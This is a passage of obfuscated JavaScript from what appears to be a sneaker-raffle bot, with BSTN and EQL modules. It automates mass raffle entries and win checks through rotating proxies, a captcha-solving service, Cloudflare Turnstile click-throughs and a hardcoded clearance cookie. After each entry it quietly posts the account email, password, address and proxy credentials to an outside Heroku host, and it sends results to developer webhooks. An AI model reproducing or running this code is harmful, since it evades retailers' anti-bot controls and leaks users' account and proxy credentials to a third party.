                                    await _0x40ef0e['waitForSelector']('.account-nav'), _0x3a72e9 = 'no', console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Task\x20' + (_0x160a01 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x86a624 = await _0x3d56af(null, _0xde2b0f, 'ver', ![]);
                                    const _0x2f7dfe = { 'succesDEVMSG': { 'embeds': [_0x86a624] } };
                                    await _0xa0452b(_0x4abb13, _0x2f7dfe['succesDEVMSG']);
                                } catch {
                                    _0x3a72e9 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x3231f1) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Task\x20' + (_0x160a01 + 0x1) + '\x20:\x20' + _0x3231f1));
                                var _0x21a108 = _0x3231f1, _0x3adb6a = await _0x3d56af(null, _0xde2b0f, 'ver', !![], _0x21a108);
                                const _0x5cf220 = { 'errorDEVMSG': { 'embeds': [_0x3adb6a] } };
                                _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x5cf220['errorDEVMSG']), await _0xa0452b(_0x5522d1, _0x5cf220['errorDEVMSG']);
                            } finally {
                                if (_0x2c2e35)
                                    _0x2c2e35['close']();
                                if (_0x3a72e9 == 'yes' && _0x5acae0 != 0x5)
                                    return console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Task\x20' + (_0x160a01 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5acae0 + '\x20/\x205)')), _0x2027d1--, _0x5acae0 = _0x5acae0 + 0x1, _0x177b87(_0xde2b0f, _0x271d55, _0x904d85, _0x160a01, _0x5acae0);
                                _0x3a72e9 == 'yes' && _0x5acae0 >= 0x5 && (_0x3a72e9 = 'no', _0x5acae0 = 0x0), _0x2027d1--, console['log'](_0x1a8584() + '\x20[' + _0xde2b0f['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                            }
                        }
                        if (_0xe697e == _0x236a56['length'] - 0x1) {
                            await _0x177b87(_0x26e12d, _0x236a56, _0xf7b603, _0xe697e, 0x0);
                            return;
                        }
                        _0x177b87(_0x26e12d, _0x236a56, _0xf7b603, _0xe697e, 0x0), await _0x1e21d2(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5d92ac, _0x59209c, _0x5462ec) {
                    var _0x11e11c = 0x0, _0x566076 = _0x59209c;
                    for (var _0x40f63a = 0x0; _0x40f63a < _0x59209c['length']; _0x40f63a++) {
                        maxTasks = Number(_0x4558f2['threads']);
                        while (_0x11e11c >= maxTasks) {
                            await _0x1e21d2(_0x4558f2['delay']);
                        }
                        let _0x4500cd = ![];
                        async function _0x46f463(_0x230086, _0x27fb91, _0x4bbf80, _0x2b9b9f, _0x5c4edd) {
                            _0x11e11c++, _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4558f2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x61f5a1, _0x2f820d = _0x27fb91[_0x2b9b9f];
                            try {
                                await _0x437e8(_0x27fb91, _0x2b9b9f);
                            } catch {
                                _0x186837 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x220173(_0x238855) {
                                const _0x7487d5 = _0x534d99['readFileSync']('../successful-tasks.csv', 'utf8'), _0x305dd9 = _0x4d3f8b['parse'](_0x7487d5, { 'header': !![] })['data'];
                                let _0x1351aa = ![];
                                for (var _0x4a079e of _0x305dd9) {
                                    if (_0x4a079e['Url'] == _0x238855['Url'] && _0x4a079e['Email'] == _0x238855['Email']) {
                                        _0x1351aa = !![];
                                        break;
                                    }
                                }
                                return _0x1351aa;
                            }
                            _0x4a5c1f(_0x230086['name'] + '\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20/\x20' + _0x27fb91['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                            var _0x22e2a9 = Math['round'](Math['random']() * (_0x4bbf80['length'] - 0x1)), _0x132f68 = _0x4bbf80[_0x22e2a9]['split'](':'), _0x76ebc0;
                            let _0x556197 = ![], _0x186837 = 'no';
                            try {
                                if (await _0x220173(_0x27fb91[_0x2b9b9f]) == !![]) {
                                    console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x556197 = !![], _0x4500cd = !![];
                                    return;
                                }
                                try {
                                    _0x76ebc0 = await _0x16ed0a['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x132f68[0x0] + ':' + _0x132f68[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x76ebc0 = await _0x16ed0a['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x132f68[0x0] + ':' + _0x132f68[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x141c0a = await _0x76ebc0['newPage'](), _0x12cf11 = await _0x141c0a['target']()['createCDPSession'](), { windowId: _0x2246ba } = await _0x12cf11['send']('Browser.getWindowForTarget');
                                await _0x141c0a['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x692bd3 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x141c0a['authenticate']({
                                    'username': '' + _0x132f68[0x2],
                                    'password': '' + _0x132f68[0x3]
                                }), console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x141c0a['goto']('' + _0x27fb91[_0x2b9b9f]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1e21d2(0x1388);
                                var _0x37b4cc = await _0x141c0a['$']('#turnstile-wrapper');
                                if (_0x37b4cc) {
                                    console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1e21d2(0x2710);
                                    const _0x356129 = await _0x141c0a['$']('#turnstile-wrapper');
                                    if (_0x356129)
                                        try {
                                            await _0x356129['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x141c0a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x2f9c95 = await _0x141c0a['$']('#turnstile-wrapper');
                                        if (_0x2f9c95)
                                            try {
                                                await _0x2f9c95['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x141c0a['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x12cf11['send']('Browser.setWindowBounds', {
                                    'windowId': _0x2246ba,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x1e21d2(0x1388), await _0x141c0a['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x141c0a['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Logging\x20in'), await _0x141c0a['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x23a25f => _0x23a25f['click']()), await _0x141c0a['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x141c0a['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1e21d2(0x7d0), await _0x141c0a['waitForSelector']('#email-login'), await _0x141c0a['type']('#email-login', '' + _0x27fb91[_0x2b9b9f]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x1e21d2(0xdac), await _0x141c0a['waitForSelector']('#password'), await _0x141c0a['type']('#password', '' + _0x27fb91[_0x2b9b9f]['Password'], { 'delay': 0xe6 }), await _0x1e21d2(0x157c);
                                try {
                                    await _0x141c0a['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x24ff34 => _0x24ff34['click']());
                                } catch {
                                }
                                try {
                                    await _0x141c0a['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x4d16a7) {
                                }
                                await _0x1e21d2(0x3e8);
                                const _0x44348e = await _0x141c0a['$']('.enteredDraw_container__2KmQ_');
                                if (_0x44348e) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x27fb91[_0x2b9b9f]['Size']);
                                try {
                                    if (_0x27fb91[_0x2b9b9f]['Size'] != 'RANDOM') {
                                        var _0x3ffd82 = _0x27fb91[_0x2b9b9f]['Size']['replace']('.', ',');
                                        const _0x1ccd64 = await _0x141c0a['$x']('//div[contains(text(),\x20\x27' + _0x3ffd82 + '\x27)]');
                                        await _0x1ccd64[0x0]['click']();
                                    } else {
                                        const _0x2fb247 = await _0x141c0a['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x443f96 = Math['round'](Math['random']() * (_0x2fb247['length'] - 0x1));
                                        await _0x2fb247[_0x443f96]['click']();
                                    }
                                } catch (_0x53faab) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x1e21d2(0x1f4);
                                const _0x1eb4f7 = await _0x141c0a['$']('.addressList_addressItem__LE2PB');
                                if (_0x1eb4f7 && _0x27fb91[_0x2b9b9f]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Filling\x20Address'), await _0x141c0a['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x1e21d2(0x5dc), await _0x141c0a['waitForSelector']('#firstname'), await _0x141c0a['type']('#firstname', '' + _0x27fb91[_0x2b9b9f]['FirstName']), await _0x1e21d2(0x1f4), await _0x141c0a['waitForSelector']('#firstname'), await _0x141c0a['type']('#lastname', '' + _0x27fb91[_0x2b9b9f]['LastName']), await _0x1e21d2(0x1f4), await _0x141c0a['waitForSelector']('#firstname'), await _0x141c0a['type']('#street', '' + _0x27fb91[_0x2b9b9f]['Address1']), await _0x1e21d2(0x1f4), await _0x141c0a['waitForSelector']('#firstname'), await _0x141c0a['type']('#houseNumber', _0x27fb91[_0x2b9b9f]['HouseNumber'] + '\x20' + _0x27fb91[_0x2b9b9f]['Address2']), await _0x1e21d2(0x1f4), await _0x141c0a['waitForSelector']('#firstname'), await _0x141c0a['select']('#country_code', '' + _0x27fb91[_0x2b9b9f]['Country']), await _0x1e21d2(0x1f4), await _0x141c0a['type']('#postcode', '' + _0x27fb91[_0x2b9b9f]['Zip']), await _0x1e21d2(0x1f4), await _0x141c0a['type']('#city', '' + _0x27fb91[_0x2b9b9f]['City']), await _0x1e21d2(0x1f4), await _0x141c0a['type']('#telephone', '' + _0x27fb91[_0x2b9b9f]['Phone']), await _0x1e21d2(0x1f4), await _0x141c0a['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x1e21d2(0x9c4);
                                try {
                                    await _0x141c0a['type']('#instagram_name', '' + _0x27fb91[_0x2b9b9f]['Follower']), await _0x141c0a['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1e21d2(0x5dc);
                                try {
                                    await _0x141c0a['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x1e21d2(0x5dc), await _0x141c0a['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x21f407 => _0x21f407['click']()), await _0x1e21d2(0x1388);
                                try {
                                    await _0x141c0a['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x141c0a['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x27fb91[_0x2b9b9f]['Size'] != 'RANDOM') {
                                        var _0x3ffd82 = _0x27fb91[_0x2b9b9f]['Size']['replace']('.', ',');
                                        const _0x18fc6e = await _0x141c0a['$x']('//div[contains(text(),\x20' + _0x3ffd82 + ')]');
                                        await _0x18fc6e[0x0]['click']();
                                    } else {
                                        const _0x1b84bc = await _0x141c0a['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x443f96 = Math['round'](Math['random']() * (_0x1b84bc['length'] - 0x1));
                                        await _0x1b84bc[_0x443f96]['click']();
                                    }
                                    await _0x1e21d2(0x5dc);
                                    try {
                                        await _0x141c0a['hover']('#instagram_name'), await _0x141c0a['type']('#instagram_name', '' + _0x27fb91[_0x2b9b9f]['Follower']), await _0x141c0a['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c4edd + '\x20/\x205)');
                                    try {
                                        await _0x141c0a['hover']('.checkBox_boxHolder__wLGVe'), await _0x1e21d2(0x5dc), await _0x141c0a['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x1e21d2(0x157c), await _0x141c0a['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x39e748 => _0x39e748['click']()), await _0x1e21d2(0x1388), await _0x141c0a['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x186837 = 'no', _0x406375(_0x27fb91[_0x2b9b9f], _0x230086);
                                try {
                                    prxdata = {
                                        'username': _0xf4f7bc['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x400355),
                                        'proxy': '' + _0x4bbf80[_0x2b9b9f]
                                    };
                                    var _0x221df3 = JSON['stringify'](prxdata);
                                    let _0x57e1c8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x221df3, _0x57e1c8);
                                } catch (_0x22ac22) {
                                }
                                console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x111e04 = await _0x3d56af(_0x27fb91[_0x2b9b9f], _0x230086, 'dev', ![]), _0x4871b1 = await _0x3d56af(_0x27fb91[_0x2b9b9f], _0x230086, 'pub', ![]);
                                const _0xd4919e = {
                                    'succesDEVMSG': { 'embeds': [_0x111e04] },
                                    'succesPUBMSG': { 'embeds': [_0x4871b1] }
                                };
                                let _0x400355 = _0x27fb91[_0x2b9b9f];
                                try {
                                    prxdata = {
                                        'username': _0xf4f7bc['replace']('#', ''),
                                        'module': _0x230086['name'],
                                        'entrydata': JSON['stringify'](_0x400355),
                                        'proxy': '' + _0x4bbf80[_0x2b9b9f]
                                    };
                                    var _0x221df3 = JSON['stringify'](prxdata);
                                    let _0x1bb574 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x221df3, _0x1bb574);
                                } catch (_0xc544df) {
                                }
                                try {
                                    _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0xd4919e['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0xd4919e['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0xd4919e['succesPUBMSG']);
                                } catch (_0xf2a017) {
                                    console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf2a017));
                                }
                            } catch (_0x2a7662) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20' + _0x2a7662)), _0x186837 = 'yes', _0x61f5a1 = '' + _0x2a7662;
                                var _0x2f7236 = await _0x3d56af(_0x27fb91[_0x2b9b9f], _0x230086, 'dev', !![], _0x61f5a1), _0x111e04 = await _0x3d56af(_0x27fb91[_0x2b9b9f], _0x230086, 'dev', ![]), _0x4871b1 = await _0x3d56af(_0x27fb91[_0x2b9b9f], _0x230086, 'pub', ![]);
                                const _0xae3ce0 = {
                                    'succesDEVMSG': { 'embeds': [_0x111e04] },
                                    'succesPUBMSG': { 'embeds': [_0x4871b1] }
                                };
                                _0xae3ce0['errorDEV'] = { 'embeds': [_0x2f7236] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0xae3ce0['errorDEV']), await _0xa0452b(_0x5522d1, _0xae3ce0['errorDEV']);
                            } finally {
                                _0x76ebc0 && _0x76ebc0['close']();
                                if (_0x186837 == 'yes' && _0x5c4edd != 0x5)
                                    return console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Task\x20' + (_0x2b9b9f + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c4edd + '\x20/\x205)')), _0x5c4edd = _0x5c4edd + 0x1, _0x11e11c--, _0x46f463(_0x230086, _0x27fb91, _0x4bbf80, _0x2b9b9f, _0x5c4edd);
                                _0x186837 == 'yes' && _0x5c4edd >= 0x5 && _0x456859(_0x27fb91[_0x2b9b9f], _0x230086), !_0x556197 && (console['log'](_0x1a8584() + '\x20[' + _0x230086['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay'])), _0x11e11c--;
                            }
                        }
                        _0x46f463(_0x5d92ac, _0x566076, _0x5462ec, _0x40f63a, 0x0), await _0x1e21d2(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1840f1, _0x31d8be) {
                    var _0x3c9e60 = 0x0, _0x5673b6;
                    try {
                        const _0x3c6679 = _0x534d99['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x5673b6 = _0x4d3f8b['parse'](_0x3c6679, { 'header': !![] })['data'];
                    } catch (_0xc46939) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0xfa45a2 = 0x0; _0xfa45a2 < _0x5673b6['length']; _0xfa45a2++) {
                        maxTasks = Number(_0x4558f2['threads']);
                        while (_0x3c9e60 >= maxTasks) {
                            await _0x1e21d2(_0x4558f2['delay']);
                        }
                        async function _0x3082d2(_0x531bc0, _0x5b6deb, _0x26da71, _0xed6a8a, _0x1f7307) {
                            _0x3c9e60++, _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4558f2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x13e188 != 'yes')
                                var _0x13e188 = '', _0x1f7307 = 0x0;
                            var _0x2a97b2;
                            _0x4a5c1f(_0x531bc0['name'] + '\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20/\x20' + _0x26da71['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                            var _0x111a1d = await _0x3d56af(_0x26da71[_0xed6a8a], _0x531bc0, 'acc', ![]);
                            const _0x1e12cd = { 'succesDEVMSG': { 'embeds': [_0x111a1d] } }, _0x314c3f = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x4ea60d = Math['round'](Math['random']() * (_0x5b6deb['length'] - 0x1)), _0xb0a1dc = _0x5b6deb[_0x4ea60d]['split'](':'), _0x1366b9;
                            try {
                                _0x1366b9 = await _0x16ed0a['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xb0a1dc[0x0] + ':' + _0xb0a1dc[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x1366b9 = await _0x16ed0a['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xb0a1dc[0x0] + ':' + _0xb0a1dc[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20Checking\x20' + _0x26da71[_0xed6a8a]['Email']);
                                const _0x43a4f0 = await _0x1366b9['newPage']();
                                await _0x43a4f0['authenticate']({
                                    'username': '' + _0xb0a1dc[0x2],
                                    'password': '' + _0xb0a1dc[0x3]
                                }), console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43a4f0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x43a4f0['setRequestInterception'](!![]), _0x43a4f0['on']('request', _0x3a943c => {
                                    _0x3a943c['resourceType']() === 'image' ? _0x3a943c['abort']() : _0x3a943c['continue']();
                                });
                                try {
                                    await _0x43a4f0['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x43a4f0['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x13e188 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x43a4f0['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1e21d2(0x3e8), await _0x43a4f0['type']('#email', _0x26da71[_0xed6a8a]['Email']), await _0x1e21d2(0x1f4), await _0x43a4f0['type']('#pass', _0x26da71[_0xed6a8a]['Password']), await _0x1e21d2(0x1f4), await _0x43a4f0['$eval']('#login-form', _0x5754d0 => _0x5754d0['submit']());
                                try {
                                    await _0x43a4f0['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x1e21d2(0x190);
                                const _0x37f52f = await _0x43a4f0['evaluate'](() => {
                                    const _0x1a6922 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x1a6922['map'](_0x1e5f82 => _0x1e5f82['alt']);
                                }), _0x529d5f = await _0x43a4f0['evaluate'](() => {
                                    const _0x432fa4 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x432fa4['map'](_0x100998 => _0x100998['innerHTML']);
                                }), _0x5505d7 = await _0x43a4f0['$$']('.raffle-winner');
                                if (_0x5505d7['length'] < 0x1) {
                                    console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x13e188 = 'no';
                                    return;
                                }
                                console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20' + _0x5505d7['length'] + '\x20Wins\x20Found!');
                                for (var _0x344735 = 0x0; _0x344735 < _0x5505d7['length']; _0x344735++) {
                                    console['log'](_0x31f5da['green'](_0x37f52f[_0x344735] + _0x529d5f[_0x344735]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x2a4718) {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20' + _0x2a4718)), _0x2a97b2 = '' + _0x2a4718;
                                var _0x345e65 = await _0x3d56af(_0x26da71[_0xed6a8a], _0x531bc0, 'acc', !![], _0x2a97b2);
                                _0x1e12cd['errorDEV'] = { 'embeds': [_0x345e65] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x1e12cd['errorDEV']), await _0xa0452b(_0x5522d1, _0x1e12cd['errorDEV']), _0x13e188 = 'yes';
                            } finally {
                                if (_0x1366b9)
                                    _0x1366b9['close']();
                                if (_0x13e188 == 'yes' && _0x1f7307 != 0x5)
                                    return console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Task\x20' + (_0xed6a8a + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f7307 + '\x20/\x205)')), _0x3c9e60--, _0x1f7307 = _0x1f7307 + 0x1, _0x3082d2(_0x531bc0, _0x5b6deb, _0x26da71, _0xed6a8a, _0x1f7307);
                                _0x13e188 == 'yes' && _0x1f7307 >= 0x5 && (_0x456859(_0x26da71[_0xed6a8a], _0x531bc0), _0x13e188 = 'no', _0x1f7307 = 0x0), console['log'](_0x1a8584() + '\x20[' + _0x531bc0['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']), _0x3c9e60--;
                            }
                        }
                        _0x3082d2(_0x1840f1, _0x31d8be, _0x5673b6, _0xfa45a2, 0x0), await _0x1e21d2(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x4909a3, _0x453ca6, _0x32fd12) {
                _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4558f2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3771c6 = 0x0; _0x3771c6 < _0x453ca6['length']; _0x3771c6++) {
                    var _0x38e390;
                    _0x4a5c1f(_0x4909a3['name'] + '\x20Task\x20' + (_0x3771c6 + 0x1) + '\x20/\x20' + _0x453ca6['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                    try {
                        await _0x437e8(_0x453ca6, _0x3771c6);
                    } catch {
                        _0x24d7db = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x479a83(_0x1bb070) {
                        const _0x4ccd3c = _0x534d99['readFileSync']('../successful-tasks.csv', 'utf8'), _0xcdcbea = _0x4d3f8b['parse'](_0x4ccd3c, { 'header': !![] })['data'];
                        let _0x239b0c = ![];
                        for (var _0x208f5a of _0xcdcbea) {
                            if (_0x208f5a['Url'] == _0x1bb070['Url'] && _0x208f5a['Email'] == _0x1bb070['Email']) {
                                _0x239b0c = !![];
                                break;
                            }
                        }
                        return _0x239b0c;
                    }
                    if (await _0x479a83(_0x453ca6[_0x3771c6]) == !![]) {
